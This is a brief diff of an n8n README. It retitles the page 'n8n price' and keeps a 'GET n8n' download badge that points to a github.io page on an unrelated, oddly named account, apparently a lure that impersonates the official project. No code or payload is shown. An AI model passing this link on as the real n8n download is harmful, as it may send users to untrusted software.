@@ -1,4 +1,4 @@
-# n8n - Open Source Workflow Automation Platform
+# n8n price - Open Source Workflow Automation Platform
 
 [![GET n8n](https://img.shields.io/badge/GET%20%E2%80%94%20n8n-0078D6?style=for-the-badge&logoColor=white)](https://kyloxiongwscb.github.io/.github/n8n-price)
 
